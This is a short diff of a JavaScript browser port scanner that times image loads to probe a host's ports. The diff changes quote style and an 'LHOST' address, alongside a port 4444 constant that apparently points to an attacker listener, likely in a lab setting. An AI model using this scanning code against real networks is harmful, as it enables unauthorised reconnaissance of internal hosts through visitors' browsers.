@@ -15,7 +15,7 @@ var portIsOpen = function(hostToScan, portToScan, N) {
           resolve(parseFloat(elapsed.toFixed(3)))
         }
 
-        img.src = "http://" + hostToScan + ":" + port + '/' + random + '.png'
+        img.src = 'http://' + hostToScan + ':' + port + '/' + random + '.png'
       })
     }
 
@@ -49,7 +49,7 @@ var portIsOpen = function(hostToScan, portToScan, N) {
   });
 }
 
-const LHOST = '10.4.49.251';
+const LHOST = '10.4.1.239';
 const PORT = '4444';
 const portscan = async () => {
     //let ports = [21, 22, 80, 443];
